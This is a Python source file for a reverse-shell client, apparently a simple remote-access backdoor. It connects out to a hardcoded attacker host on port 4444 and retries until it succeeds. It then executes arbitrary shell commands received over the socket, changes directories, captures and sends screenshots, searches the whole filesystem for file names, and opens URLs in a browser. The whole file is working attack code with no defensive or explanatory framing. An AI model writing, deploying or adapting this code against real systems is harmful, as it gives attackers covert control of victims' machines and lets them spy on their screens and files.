import socket
import subprocess
import os
import time
from PIL import ImageGrab  # Requires 'Pillow' library
import webbrowser

# Configuration
SERVER_HOST = "192.168.79.129"  # Replace with the server IP
SERVER_PORT = 4444
BUFFER_SIZE = 1024

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server {SERVER_HOST}:{SERVER_PORT}")
            return client_socket
        except socket.error:
            print("Connection failed, retrying in 5 seconds...")
            time.sleep(5)

def execute_command(command):
    try:
        if command.lower() == "exit":
            return "exit"
        elif command[:2].lower() == "cd":
            os.chdir(command[3:])
            return f"Changed directory to {os.getcwd()}"
        elif command.lower() == "screenshot":
            screenshot_path = "/tmp/screenshot.png"
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            return screenshot_path  # Send path of saved screenshot
        elif command[:6].lower() == "search":
            search_query = command[7:]
            search_result = search_files(search_query)
            return search_result
        elif command[:3].lower() == "web":
            url = command[4:]
            webbrowser.get('firefox').open(url)
            return f"Opened website {url} in Firefox"
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def search_files(query):
    result = ""
    for root, dirs, files in os.walk("/"):  # Start searching from root directory
        for name in files:
            if query in name:
                result += os.path.join(root, name) + "\n"
        for name in dirs:
            if query in name:
                result += os.path.join(root, name) + "\n"
    return result if result else "No files or directories found."

def send_file(client_socket, file_path):
    with open(file_path, "rb") as f:
        client_socket.sendall(f.read())

def main():
    client_socket = connect_to_server()

    while True:
        try:
            command = client_socket.recv(BUFFER_SIZE).decode()
            response = execute_command(command)

            if response == "exit":
                client_socket.close()
                break
            elif response == "/tmp/screenshot.png":
                send_file(client_socket, response)
            else:
                client_socket.send(response.encode())
        except Exception as e:
            print(f"Error: {e}")
            client_socket.close()
            client_socket = connect_to_server()

if __name__ == "__main__":
    main()
